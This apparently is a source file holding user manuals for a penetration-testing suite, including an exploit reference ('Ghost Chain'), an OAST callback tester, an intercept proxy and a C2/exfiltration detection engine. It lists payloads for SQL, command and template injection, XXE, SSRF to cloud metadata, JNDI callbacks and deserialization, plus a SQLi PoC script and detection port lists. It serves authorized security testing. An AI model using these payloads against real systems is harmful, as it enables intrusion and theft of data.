     • HTTP URL: http://abc123.oast.proxhqvpn.com
     • DNS payload: \${IFS}nslookup abc123.oast.proxhqvpn.com
     • JNDI: \${jndi:ldap://abc123.oast.proxhqvpn.com/a}
  4. Inject the payload into the target application (URL param, header, XML body, etc.).
  5. Watch the "Live Interactions" panel — any callback from the server appears
     within seconds showing: timestamp, source IP, interaction type, raw payload.
  6. A callback confirms the vulnerability is exploitable out-of-band.

  Payload Types Available:
  • HTTP GET / POST callback URLs
  • DNS resolution payloads (nslookup, dig, curl variants)
  • SMTP callback addresses
  • JNDI LDAP injection strings (Log4Shell variants)
  • Burp Collaborator-compatible format

  Legal Note:
  OAST payloads must only be injected into systems you own or have written
  authorization to test. All interactions are logged with timestamp and source IP.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. DEPENDENCY SCANNER (/dep-scanner)

  Overview:
  Scans project dependency manifests for known CVEs across all major
  package ecosystems. Results are severity-ranked with fix guidance.

  Supported Package Managers:
  • npm / yarn / pnpm (package.json, package-lock.json, yarn.lock)
  • pip / poetry (requirements.txt, pyproject.toml, Pipfile)
  • Cargo (Cargo.toml, Cargo.lock)
  • Go modules (go.mod, go.sum)
  • Maven / Gradle (pom.xml, build.gradle)
  • Composer (composer.json, composer.lock)
  • RubyGems (Gemfile, Gemfile.lock)
  • NuGet (.csproj, packages.config)

  How to Use:
  1. Navigate to /dep-scanner.
  2. Upload your manifest file(s) or paste the contents directly.
  3. Click "Scan Dependencies."
  4. Results appear within 10–30 seconds, grouped by severity:
     CRITICAL → HIGH → MEDIUM → LOW → INFO
  5. Each finding shows:
     • Package name and vulnerable version
     • CVE ID(s) with CVSS score
     • Description of the vulnerability
     • Fixed version (if available)
     • Direct upgrade command (npm install pkg@x.y.z, etc.)
  6. Click "Export Report" to download findings as CSV or JSON.

  Data Sources:
  • NVD (National Vulnerability Database)
  • GitHub Advisory Database
  • OSV (Open Source Vulnerabilities)
  • Snyk Vulnerability DB
  • npm audit / pip-audit native APIs

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. TOKEN SEQUENCER (/token-seq)

  Overview:
  Token Sequencer captures session tokens or other application-generated
  values and performs statistical entropy analysis to detect predictability
  weaknesses that could allow an attacker to forge valid tokens.

  What It Tests:
  • Randomness quality of session IDs, CSRF tokens, API keys, password reset tokens
  • Entropy (bits of randomness) — OWASP recommends ≥ 128 bits
  • Pattern detection: sequential IDs, timestamp-based tokens, base64-encoded integers
  • Prediction feasibility: can the next token be guessed from previous samples?

  How to Use:
  1. Navigate to /token-seq.
  2. Paste a list of token samples (minimum 100, ideally 500+).
     Collect from: login cookies, response headers, CSRF input fields.
  3. Click "Analyze."
  4. Results show:
     • Entropy estimate (bits)
     • Character space analysis
     • Pattern signature (sequential / timestamp-based / random)
     • Prediction risk rating: SAFE / WEAK / VULNERABLE
  5. For WEAK or VULNERABLE tokens: use the "Prediction Attack" tab to generate
     candidate tokens from the observed pattern for authorized testing.

  Interpretation:
  • > 128 bits entropy: Generally safe for session tokens
  • 64–128 bits: Marginal — acceptable only for low-risk tokens
  • < 64 bits: High risk — predictable under targeted attack
  • Sequential integers / timestamps: Immediately vulnerable

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. WEBSOCKET TESTER (/ws-tester)

  Overview:
  WebSocket Tester is a full WebSocket client with intercept, replay,
  and fuzzing capabilities — equivalent to Burp Suite's WebSocket tab.

  Use Cases:
  • Test real-time applications (chat, trading, gaming, live data feeds)
  • Identify authentication/authorization flaws in WS connections
  • Fuzz WebSocket message payloads for injection vulnerabilities
  • Replay captured frames to test business logic

  How to Use:
  1. Navigate to /ws-tester.
  2. Enter the target WebSocket URL: ws:// or wss://
  3. Add custom headers (e.g., Authorization: Bearer <token>) if required.
  4. Click "Connect" — the connection status and handshake headers are displayed.
  5. In the "Messages" panel, type any payload and click "Send."
  6. All sent and received frames appear in the message log with timestamps.
  7. Click any received frame and "Send to Repeater" to modify and replay it.
  8. Use the "Fuzzer" tab to automatically iterate payloads from a wordlist
     against a selected message template.

  Common Test Payloads:
  • XSS in message body: <img src=x onerror=alert(1)>
  • IDOR: change user_id field to another user's ID
  • Privilege escalation: modify role/permission fields in JSON payloads
  • SQL injection: inject ' OR 1=1 -- into query parameters in the WS message

  Legal Note:
  Only test WebSocket endpoints on systems you own or have authorization to test.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. SAST SCANNER (/sast)
   Static Application Security Testing

  Overview:
  SAST Scanner performs source code analysis without execution, identifying
  security vulnerabilities in your codebase by pattern-matching against
  35+ vulnerability signatures across 12 languages.

  Supported Languages:
  JavaScript / TypeScript, Python, Java, Go, PHP, Ruby, C/C++,
  C#/.NET, Rust, Bash/Shell, SQL, Dockerfile / YAML configs

  Vulnerability Patterns Detected (35+):
  • Injection: SQL injection, command injection, LDAP injection, XPath injection
  • XSS: reflected, stored, DOM (unsanitized innerHTML, document.write)
  • Secrets: hardcoded API keys, passwords, tokens, private keys
  • Insecure crypto: MD5/SHA-1 usage, ECB mode, hardcoded IV
  • Path traversal: unsanitized file paths, directory traversal
  • Deserialization: unsafe pickle, Java ObjectInputStream, PHP unserialize
  • SSRF: unvalidated URL inputs passed to HTTP clients
  • Prototype pollution: recursive merge patterns in JavaScript
  • Weak authentication: JWT alg:none, missing expiry, hardcoded secrets
  • Insecure dependencies: cross-references with dep-scanner CVE data
  • CORS misconfiguration: wildcard origin with credentials
  • Insecure direct object reference patterns: unvalidated ID parameters

  How to Use:
  1. Navigate to /sast.
  2. Upload a ZIP of your source code, paste a code snippet, or connect
     a GitHub repository (OAuth required).
  3. Select languages to scan (or use auto-detect).
  4. Click "Run SAST Scan."
  5. Results appear in 15–120 seconds depending on codebase size.
  6. Each finding shows:
     • File path, line number, code snippet
     • Vulnerability class and severity (CRITICAL/HIGH/MEDIUM/LOW)
     • Description and remediation guidance
     • CWE ID and OWASP Top 10 mapping
  7. Click "Export" to download findings as SARIF, JSON, or CSV.
  8. Use "Fix Suggestions" tab for AI-generated remediation code diffs.

  False Positive Management:
  • Mark false positives inline — they are excluded from future scans of the
    same file/line.
  • Adjust sensitivity (LOW / MEDIUM / HIGH) to balance coverage vs. noise.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
INTERNAL DOCUMENT — DO NOT DISTRIBUTE
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "ghost-trace-manual",
    title: "Ghost Trace — Behavioral Analysis Engine",
    subtitle: "WireGuard peer monitoring, C2 detection, exfiltration detection, and anomaly scoring",
    version: "1.4",
    pages: 18,
    icon: Eye,
    iconColor: "text-purple-400",
    tier: "pro",
    content: `Ghost Trace — Behavioral Analysis Engine — User Manual
Version 1.4 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview & Architecture
2. Baseline Learning Period
3. Detection Categories
4. Anomaly Scoring System
5. Per-Device Timeline Heatmap
6. Alert Panel & Triage
7. Quick-Block Integration
8. Alert Thresholds & Configuration
9. API Reference

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW & ARCHITECTURE

  Ghost Trace is ProxhqVPN's VPN-native agentless behavioral
  analysis engine. It monitors every WireGuard peer for anomalous
  outbound traffic patterns — without installing any software on
  the monitored device itself.

  What makes Ghost Trace unique: it operates at the WireGuard
  tunnel level. Every device connected to your VPN passes all
  traffic through the ProxhqVPN server. Ghost Trace observes
  every packet at this chokepoint — the device has no way to hide
  outbound connections from it.

  Backend: Express API at /api/ghost-trace
  Frontend: /ghost-trace (Command Center Pro)
  DB tables: ghost_trace_observations, ghost_trace_baselines

  Monitored per peer:
  • Total bytes in / bytes out per hour
  • Destination IPs and ports
  • Connection frequency (packets per minute)
  • Protocol distribution (HTTPS, DNS, NTP, SSH, etc.)
  • Geographic distribution of destinations

2. BASELINE LEARNING PERIOD

  Ghost Trace builds a behavioral baseline for each peer during
  the first 24 hours after the device connects to your VPN.

  During baseline learning:
  • No alerts are generated (learning badge shown in UI)
  • All traffic flows are recorded and statistical models built
  • Normal destination IP ranges are learned per device
  • Typical bytes/hour thresholds established

  After 24 hours, the baseline is frozen and deviation detection
  starts. If a device reconnects after 7+ days absent, baseline
  relearning begins automatically.

  You can manually reset the baseline for any peer via:
  Ghost Trace → Peer List → [device] → Reset Baseline

3. DETECTION CATEGORIES

  C2 BEACONING
    Detected when: a peer sends periodic small-packet bursts to
    the same destination IP at regular intervals.

    Classic signature:
    • Packet size: 64–512 bytes
    • Interval: every 30–300 seconds (±5% jitter)
    • Duration: sustained for 30+ minutes
    • Direction: outbound only (no meaningful inbound response)

    Common sources: RATs, post-exploitation frameworks (Cobalt
    Strike, Metasploit Meterpreter), mobile spyware.

  DATA EXFILTRATION
    Detected when: bytes-out significantly exceeds bytes-in over
    a sustained period, to IPs not in the device's normal pattern.

    Thresholds (configurable):
    • High: > 500 MB outbound in 60 minutes to a new IP
    • Critical: > 2 GB outbound to a single non-CDN IP

    Context exclusions: Google Drive, Dropbox, iCloud, OneDrive
    IPs are whitelisted by default to reduce false positives.

  MALICIOUS DESTINATION
    Detected when: any connection is made to an IP or domain
    matching known threat intelligence feeds:
    • AbuseIPDB confidence score > 80
    • Emerging Threats IP blocklist
    • Spamhaus DROP/EDROP
    • Known Tor exit node (if Tor use is not expected)
    • Known botnet C2 infrastructure

    Feed updates: every 4 hours automatically.

  GHOST TRAFFIC
    Detected when: outbound traffic originates from a peer that
    is not associated with any user-visible application.
    Signature: traffic at times when device activity logs show
    the device is idle (screen off, no keyboard/mouse events).
    Indicates: rootkits, kernel-level implants, or hardware
    backdoors (rare but detectable via timing patterns).

  ANOMALOUS PORT USAGE
    Detected when: a peer connects to non-standard ports that
    it has not used historically:
    • Port 4444 (Metasploit default)
    • Port 1337, 31337 (common RAT ports)
    • Port 9050 (Tor — if not expected)
    • High ephemeral ports used for exfiltration (>50000)

4. ANOMALY SCORING SYSTEM

  Each peer gets a real-time anomaly score from 0 to 100.

  Score ranges:
    0–30   CLEAN — normal behavior
    31–60  WATCH — minor deviations, informational only
    61–80  ELEVATED — review recommended
    81–90  HIGH — alert generated, manual review required
    91–100 CRITICAL — auto-populate Firewall block suggestion

  Score contributors (additive):
    +15  Known bad destination IP (threat feed match)
    +20  Confirmed C2 beaconing pattern
    +25  Data exfiltration threshold crossed
    +10  Anomalous port usage
    +10  Traffic at anomalous time (device normally idle)
    +30  Multiple categories triggered simultaneously

  Score decays 5 points per hour with no new anomaly events.

5. PER-DEVICE TIMELINE HEATMAP

  Each peer has a 24-hour traffic heatmap visualization showing:
  • X-axis: time (hour 0–23)
  • Y-axis: device (one row per registered WireGuard peer)
  • Color intensity: traffic volume (green→yellow→red)

  How to read it:
  • Consistent activity across all hours → normal (always-on service)
  • Burst at 3–4 AM with device otherwise idle → suspicious
  • Sudden bandwidth spike to level never seen before → investigate
  • Perfectly regular spikes at fixed intervals → potential C2

  Click any hour cell to see the full flow log for that peer and
  that specific hour: destination IPs, ports, bytes, protocol.

6. ALERT PANEL & TRIAGE

  All anomaly alerts appear in Ghost Trace → Alerts tab.
  Each alert shows:
  • Peer (device name / WireGuard public key prefix)
  • Alert type (C2 / Exfil / Malicious Dest / Ghost / Port)
  • First seen / Last seen timestamps
  • Anomaly score at time of alert
  • Top destination IP(s) involved
  • Traffic sample (bytes in/out, packet rate)

  Triage workflow:
  1. Review the alert details and timeline heatmap for context.
  2. Check the destination IP in Threat Intel (/threat-intel).
  3. If confirmed malicious: click "Block IP" → adds to Firewall.
  4. If false positive: click "Mark Safe" → adds to peer whitelist.
  5. If uncertain: click "Watch" → keeps in watch list, no block.

7. QUICK-BLOCK INTEGRATION

  From any Ghost Trace alert or observation:
  • Click "Block IP" → the destination IP is immediately added to
    the Firewall blocklist across all VPN nodes.
  • The peer remains connected to your VPN — only the specific
    malicious destination is blocked, not the device itself.
  • A corresponding Firewall rule is created: you can review and
    remove it in Firewall → Rules at any time.

  To block the entire peer (device) from VPN access:
  Ghost Trace → Peer List → [device] → Revoke VPN Access
  This removes the peer's WireGuard public key from the server.

8. ALERT THRESHOLDS & CONFIGURATION

  Ghost Trace → Settings → Thresholds:

  Beacon Detection Sensitivity:
    Low (fewer alerts):    interval 60–300s, 45+ minutes sustained
    Medium (default):      interval 30–300s, 30+ minutes sustained
    High (more alerts):    interval 10–300s, 15+ minutes sustained

  Exfiltration Threshold:
    Default: 500 MB in 60 min to non-CDN IP
    Adjustable: 100 MB – 10 GB (slider)

  Auto-Block on Critical Score:
    Default: OFF (manual review recommended first)
    Enable: auto-blocks firewall when score exceeds 90

  Whitelist Destinations:
    Add known-good IPs/CIDRs to suppress false positives.
    Example: add your backup provider's IP range.

9. API REFERENCE

  GET  /api/ghost-trace/observations  List all observations
  GET  /api/ghost-trace/observations/:peerId  Per-peer
  GET  /api/ghost-trace/baselines     Baseline data per peer
  POST /api/ghost-trace/baselines/:peerId/reset  Reset baseline
  GET  /api/ghost-trace/alerts        Active alerts
  POST /api/ghost-trace/alerts/:id/acknowledge  Ack alert

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "ghost-chain-manual",
    title: "Ghost Chain — Exploit Reference & Kill Chain Builder",
    subtitle: "200+ exploit techniques, PoC code, and attack path correlation engine",
    version: "2.2",
    pages: 24,
    icon: Network,
    iconColor: "text-red-500",
    tier: "pro",
    content: `Ghost Chain — Exploit Reference & Kill Chain Builder — User Manual
Version 2.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

LEGAL NOTICE: Ghost Chain is a security research and penetration
testing reference tool. All exploitation techniques described are
for authorized testing only. Only test systems you own or have
explicit written permission to test.
ALPHA UNLIMITED TECHNOLOGIES LLC assumes no liability for misuse.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview
2. Exploit Categories (4 categories, 200+ techniques)
3. Exploit Entry Format
4. PoC Code & Proof-of-Exploitation
5. Attack Chain Builder
6. 5-Stage Kill Chain Pipeline
7. Chain Correlation Engine
8. Integration with Other Tools
9. Exporting Findings

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

  Ghost Chain is ProxhqVPN's integrated exploit reference library
  and attack chain builder. It provides:

  • 200+ exploit techniques across 4 major categories
  • Ready-to-use PoC code (Python, Bash, JavaScript, SQL, XML)
  • 5-stage automated kill chain discovery pipeline
  • Attack path correlation (links multiple findings into chains)
  • SVG chain graph visualization
  • One-click export of complete chains as Markdown reports

  All Ghost Chain traffic is routed through your VPN tunnel.
  Pair with HTTP Probe or Intruder for live payload testing.

2. EXPLOIT CATEGORIES

  CATEGORY 1: INJECTION (60+ techniques)

    SQL Injection:
    • Boolean-blind: payload that changes response based on
      true/false condition (AND 1=1 vs AND 1=2)
    • UNION-based: UNION SELECT to extract columns directly
    • Error-based: force DB error messages to leak data
    • Time-based blind: SLEEP(5) / WAITFOR DELAY to confirm
    • Out-of-band (OOB): DNS/HTTP callback for blind exfil
    • Stacked queries: ; DROP TABLE via stacked query support
    • Second-order: store payload, trigger in different context

    Cross-Site Scripting (XSS):
    • Reflected: payload returned in same response
    • Stored: payload persisted in database, affects all users
    • DOM-based: payload processed by client-side JS
    • CSP bypass: nonce reuse, unsafe-eval, JSONP endpoints
    • Mutation XSS: browser DOM mutation changes escaped chars

    Server-Side Template Injection (SSTI):
    • Jinja2: {{7*7}}, {{config}}, {{request.application...}}
    • Twig: {{_self.env.registerUndefinedFilterCallback...}}
    • FreeMarker: \${freemarker.template.utility.Execute?...}
    • Pebble: {{runtime.exec('id')}}

    Command Injection:
    • Linux: ; id, | id, && id, \`id\`, $(id)
    • Windows: & whoami, | whoami, ; whoami
    • Blind OOB: curl/ping callback to OAST server

    LDAP / NoSQL / XPATH Injection:
    • LDAP: *)(&, *)(|(password=*)
    • MongoDB: {"$gt": ""}, {"$where": "1==1"}
    • XPATH: ' or '1'='1, '] | //*[contains(., '

  CATEGORY 2: SERVER-SIDE VULNERABILITIES (50+ techniques)

    SSRF (Server-Side Request Forgery):
    • Internal service access: http://127.0.0.1:PORT/path
    • Cloud metadata: http://169.254.169.254/latest/meta-data/
    • AWS IMDSv1 token: iam/security-credentials/
    • GCP metadata: http://metadata.google.internal/computeMetadata/
    • SSRF to RCE chains (via Redis, Memcached, etc.)
    • Bypass filters: http://[::1]/, http://0x7f000001/, decimal IP

    XML External Entity (XXE):
    • File read: <!ENTITY xxe SYSTEM "file:///etc/passwd">
    • SSRF via XXE: SYSTEM "http://internal-service/"
    • Out-of-band XXE: parameter entities + OOB callback
    • XXE in XLSX/DOCX/SVG upload parsers
    • Billion laughs (DoS): recursive entity expansion

    Insecure Deserialization:
    • Java gadget chains: commons-collections, spring, JDK
    • PHP: O:4:"User":1:{s:4:"data";s:4:"exec";}
    • Python pickle: REDUCE opcode for arbitrary execution
    • .NET: BinaryFormatter ViewState attacks
    • YAML: !!python/object/apply:os.system

    Path Traversal / LFI:
    • ../../../../etc/passwd (URL-encoded variants)
    • Null byte bypass: file.php%00.jpg
    • Log poisoning → RCE (access.log, /proc/self/environ)
    • PHP wrappers: php://filter, php://input, zip://

  CATEGORY 3: AUTHENTICATION & TOKENS (40+ techniques)

    JWT Attacks: (full coverage in JWT Analyzer tool)
    • alg:none — unsigned token acceptance
    • RS256→HS256 algorithm confusion
    • jku/x5u header injection
    • kid SQL injection (6 payloads)
    • Claim escalation (role, admin, scope, plan)
    • JWKS spoofing endpoint

    OAuth 2.0 Attacks:
    • Open redirect via redirect_uri
    • State parameter fixation/CSRF
    • Authorization code interception
    • Implicit flow token leakage
    • PKCE downgrade

    Session & Password:
    • Password reset poisoning via Host header
    • Username enumeration via timing/response
    • 2FA bypass: response manipulation, backup codes
    • Session fixation: pre-auth session adoption

  CATEGORY 4: WEB & PROTOCOL ATTACKS (50+ techniques)

    HTTP Request Smuggling:
    • CL.TE: Content-Length vs Transfer-Encoding conflict
    • TE.CL: Transfer-Encoding leads, Content-Length trails
    • TE.TE: both present but obfuscated (TE:  chunked)
    • Detection: timing oracle on POST to /
    • Impact: cache poisoning, session hijacking, WAF bypass

    CORS Misconfiguration:
    • Null origin reflection
    • Wildcard with credentials (impossible but misconfigured)
    • Trusted subdomain compromise → full origin

    Cache Poisoning:
    • X-Forwarded-Host header cache key exclusion
    • Fat GET: body parameter injected into cached response
    • Cache key normalization attacks

    Subdomain Takeover:
    • Detect: CNAME pointing to decommissioned service
    • Services: Heroku, GitHub Pages, Netlify, Fastly, S3
    • Impact: full XSS on parent domain's subdomains

3. EXPLOIT ENTRY FORMAT

  Each of the 200+ exploit entries contains:

  Details Tab:
  • Vulnerability description and root cause
  • How the vulnerability works (step by step)
  • Real-world CVE examples
  • Impact assessment (what an attacker can do)
  • Detection methods

  Exploit PoC Tab:
  • Ready-to-use proof-of-concept code
  • Language: Python, Bash, JavaScript, SQL, XML, or YAML
  • One-click copy button
  • Target variable placeholders clearly marked (TARGET_URL, etc.)

  Remediation Tab:
  • How to fix the vulnerability
  • Secure code example (before/after)
  • Framework-specific fixes

4. POC CODE & PROOF-OF-EXPLOITATION

  All PoC code is copy-ready. Replace placeholder values:
    TARGET_URL    → the full URL of the target endpoint
    PARAM         → the vulnerable parameter name
    CALLBACK_URL  → your OAST server URL (from OAST Tester)
    COOKIE        → session cookie value from HTTP Interceptor

  Example — Time-Based SQLi detection:
  ---
  python3 -c "
  import requests, time
  url = 'TARGET_URL'
  payload = \"' AND SLEEP(5)-- -\"
  start = time.time()
  r = requests.get(url, params={'id': payload})
  elapsed = time.time() - start
  print('VULNERABLE' if elapsed > 4 else 'NOT VULNERABLE')
  print(f'Response time: {elapsed:.2f}s')
  "
  ---

5. ATTACK CHAIN BUILDER

  The Chain Builder (Ghost Chain → Chain Builder tab) lets you
  assemble multiple findings into a complete attack narrative.

  Adding findings to a chain:
  1. Browse to any exploit in the library.
  2. Click "Add to Chain" (+ icon in top right of exploit entry).
  3. Repeat for each vulnerability in the chain.
  4. Navigate to Chain Builder → review the assembled chain.
  5. Drag findings to reorder the attack sequence.
  6. Add notes between steps for context.
  7. Click "Export Chain" to download as Markdown report.

  Example attack chain:
  Step 1: OSINT Recon → discover /admin panel exists (via crt.sh)
  Step 2: Subdomain Takeover → found CNAME to dead Heroku app
  Step 3: Stored XSS on subdomain → capture cookies of parent domain
  Step 4: Account takeover via stolen admin session
  Step 5: SSRF via admin panel → access internal metadata service

6. 5-STAGE AUTOMATED KILL CHAIN PIPELINE

  Ghost Chain → Automated Pipeline tab:

  Stage 1: SURFACE DISCOVERY
    Passive: OSINT Recon (DNS, crt.sh, AlienVault, certs)
    Active: Port scan (top 1000 ports), service fingerprint

  Stage 2: TECHNOLOGY FINGERPRINTING
    HTTP headers → framework, server, language
    JavaScript files → libraries and versions
    Error messages → backend stack traces
    Cookie names → framework signatures (PHPSESSID, JSESSIONID)

  Stage 3: VULNERABILITY TESTING
    Runs 40 lightweight probes:
    • XSS reflection test on all parameters
    • SQL injection error detection
    • Path traversal (../../../etc/passwd)
    • Open redirect (?next=https://evil.com)
    • CORS any-origin test
    • Default credentials on common admin panels
    • Exposed Git/SVN directories

  Stage 4: CHAIN CORRELATION
    Correlates findings into attack paths:
    • Groups findings by exploitation prerequisite
    • Identifies which findings chain together
    • Calculates combined impact score (higher than individual)

  Stage 5: IMPACT ASSESSMENT
    Assigns final CVSS score to the complete chain.
    Produces executive summary + technical report.
    SVG chain graph shows findings as nodes with attack path arrows.

7. INTEGRATION WITH OTHER TOOLS

  Send to HTTP Probe:
    From any exploit entry: click "Send to HTTP Probe"
    → pre-fills the URL, method, headers, and payload body.
    → Use HTTP Probe to test the payload against a live target.

  Send to Intruder:
    From any payload list: click "Send to Intruder"
    → loads the payload list for automated fuzzing.
    → Intruder tests all payloads against the target parameter.

  Import to Ghost Chain from OmniStrike:
    After an OmniStrike scan, confirmed findings can be added to
    a Ghost Chain chain via the "Add to Ghost Chain" button in
    each finding detail panel.

  Send to OAST Tester:
    For OOB techniques, Ghost Chain generates the callback URL
    from your OAST server automatically.

8. EXPORTING FINDINGS

  Chain Report (Markdown):
  • Title, date, target
  • Each step: technique name, evidence, impact, remediation
  • CVSS scores per finding + aggregate chain score
  • PoC code blocks included
  • Download: Chain Builder → Export → Markdown

  Single Finding Report:
  • Exploit Details → Export → copies formatted text to clipboard

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "http-interceptor-manual",
    title: "HTTP Interceptor — Web Proxy",
    subtitle: "Full intercept proxy: request/response editing, WebSocket, Match & Replace, replay",
    version: "1.6",
    pages: 20,
    icon: Globe,
    iconColor: "text-blue-400",
    tier: "pro",
    content: `HTTP Interceptor — Web Proxy — User Manual
Version 1.6 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview
2. Browser Proxy Setup (Firefox, Chrome, Safari)
3. CA Certificate Installation (HTTPS decryption)
4. Core Intercept Workflow
5. Request Editing Reference
6. Response Intercept
7. WebSocket Interception
8. Match & Replace Rules
9. Request History & Replay
10. Integration with Other Tools
11. Tips & Common Workflows

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

  HTTP Interceptor is a full web proxy equivalent to Burp Suite's
  Proxy module. It sits between your browser and the target,
  intercepting every HTTP/HTTPS request before it's sent and every
  response before it's displayed.

  What it enables:
  • View and modify any request in transit
  • Inject payloads without modifying the page source
  • Test authentication bypass by modifying headers/cookies
  • Intercept WebSocket frames (ws:// and wss://)
  • Define auto-modify rules that apply to every request
  • Build a complete history of all traffic for replay/analysis

  Backend proxy port: shown on the Interceptor page (default 8082)
  Frontend: /http-interceptor (Command Center Pro)

2. BROWSER PROXY SETUP

  The HTTP Interceptor is a local MITM proxy. Your browser must
  be configured to route traffic through it.

  FIREFOX:
  1. Settings → General → Network Settings → Manual proxy
  2. HTTP Proxy: 127.0.0.1  Port: [shown on Interceptor page]
  3. Check "Also use this proxy for HTTPS"
  4. Click OK.

  CHROME / EDGE:
  Option A — System proxy (applies to all browsers):
  Linux:  export http_proxy=http://127.0.0.1:8082
          export https_proxy=http://127.0.0.1:8082
  macOS:  System Prefs → Network → Proxies → Web Proxy
  Windows: Settings → Proxy → Manual proxy setup

  Option B — Chrome extension (SwitchyOmega recommended):
  1. Install SwitchyOmega extension.
  2. Create a profile: Protocol HTTP, Server 127.0.0.1, Port 8082.
  3. Activate the profile via the extension icon.

  MOBILE DEVICES (same WiFi network):
  1. Set WiFi proxy on device:
     Server: [your computer's LAN IP]  Port: 8082
  2. Install the CA certificate on the device (see Section 3).
  3. All mobile HTTP/HTTPS traffic now flows through Interceptor.

3. CA CERTIFICATE INSTALLATION

  HTTPS traffic is encrypted. To decrypt it, you must install
  the Interceptor's CA certificate in your browser/OS so the
  MITM is trusted.

  Download the CA cert:
  HTTP Interceptor → Settings → Download CA Certificate (.pem)

  Install in Firefox:
  Settings → Privacy & Security → Certificates → View Certificates
  → Authorities → Import → select the .pem file
  → Check "Trust this CA to identify websites" → OK

  Install in Chrome / system (macOS):
  Keychain Access → drag .pem onto "System" keychain
  → Double-click → Trust → "When using this certificate" → Always Trust

  Install in Chrome / system (Windows):
  certmgr.msc → Trusted Root Certification Authorities
  → Action → All Tasks → Import → select .pem

  Install on Android:
  Settings → Security → Install from storage → select .pem
  (May require setting a screen lock first)

  Install on iOS:
  Safari → navigate to http://[interceptor-ip]:8082/ca.pem
  → "Allow" → Settings → Profile Downloaded → Install → Trust

  WARNING: Remove the CA certificate when done testing.
  Leaving it installed is a security risk.

4. CORE INTERCEPT WORKFLOW

  Step 1: Start the Interceptor
    HTTP Interceptor → click "Start Proxy"
    The status indicator shows the proxy port (default 8082).
    Toggle "Intercept ON" to enable request pausing.

  Step 2: Configure your browser (see Section 2).

  Step 3: Browse to the target site in your browser.

  Step 4: The browser hangs — the Interceptor has caught a request.
    The Interceptor panel shows the full raw HTTP request:
    [METHOD] [PATH] HTTP/1.1
    Host: [target]
    [headers...]
    [body if POST]

  Step 5: Review and optionally edit the request.
    • Change method (GET → POST)
    • Add, modify, or delete headers
    • Edit cookies
    • Modify the request body
    • Change query parameters in the URL

  Step 6: Choose an action:
    Forward — send the (modified) request and catch next
    Forward All — send this and all future requests without pausing
    Drop — discard this request (browser gets no response)
    Repeat — forward and immediately re-intercept the same request

  Step 7: Toggle "Intercept OFF" to pass-through all traffic
    without pausing. Traffic still appears in the History tab.

5. REQUEST EDITING REFERENCE

  Every part of an HTTP request is editable in the Interceptor:

  Request Line:
    Method: GET POST PUT DELETE PATCH HEAD OPTIONS TRACE
    Path:    /api/user/profile → /api/user/admin
    Protocol: HTTP/1.1 (do not change unless testing HTTP/2)

  Common Header Manipulations:
    Authorization: Bearer [token]     → replace token
    Cookie: session=[value]           → replace session
    Host: target.com                  → change for Host header attacks
    X-Forwarded-For: 127.0.0.1       → IP spoofing for bypass
    Content-Type: application/json    → change encoding
    Origin: https://evil.com          → CORS testing
    Referer: https://trusted.com/     → referer-based access control

  Body (POST/PUT/PATCH):
    JSON: modify any key/value in the JSON body
    Form: key=value&key2=value2 format
    XML: direct XML edit for SOAP/XXE testing
    Binary: hex editor mode for binary protocols

6. RESPONSE INTERCEPT

  To intercept and modify server responses before they reach the
  browser:

  Toggle "Intercept Responses" in Interceptor settings.

  Useful response modifications:
  • Change HTTP status code: 403 → 200 (access control test)
  • Remove security headers: Delete X-Frame-Options (clickjacking)
  • Inject JavaScript: add <script>alert(1)</script> to response
  • Modify JSON response body: change {"admin": false} → true
  • Remove HSTS header: test for SSL stripping
  • Change redirect destination: Location: /admin → /

7. WEBSOCKET INTERCEPTION

  HTTP Interceptor intercepts WebSocket frames on ws:// and wss://.

  WebSocket panel shows:
  • Direction: → (client→server) or ← (server→client)
  • Frame timestamp
  • Frame payload (text or binary)
  • Frame opcode (text=1, binary=2, ping=9, pong=10)

  To intercept WebSocket frames:
  Settings → Enable WebSocket Intercept

  Intercepted frames can be:
  • Forwarded as-is
  • Edited (text frames only)
  • Dropped
  • Replayed (resend the same frame)
  • Injected: send arbitrary frames from the WS panel directly

  Use cases:
  • WebSocket message injection (XSS, SQLi via WS messages)
  • Privilege escalation via WS message manipulation
  • Denial of service (send malformed frames)

8. MATCH & REPLACE RULES

  Match & Replace rules automatically modify every request or
  response that passes through the proxy without manual intercept.

  Create rules: Interceptor → Match & Replace → + Add Rule

  Rule structure:
  • Scope: Request Headers / Request Body / Response Headers / Response Body
  • Match: regex pattern (RE2 syntax) or literal string
  • Replace: replacement string (supports $1 capture groups)
  • Enabled: toggle per rule

  Example rules:

  Inject XSS probe into all responses:
    Scope: Response Body
    Match: </body>
    Replace: <script>console.log('XSS-test-' + document.domain)</script></body>

  Replace Authorization token globally:
    Scope: Request Headers
    Match: Authorization: Bearer [a-zA-Z0-9._-]+
    Replace: Authorization: Bearer YOUR_TOKEN_HERE

  Remove X-Frame-Options from all responses:
    Scope: Response Headers
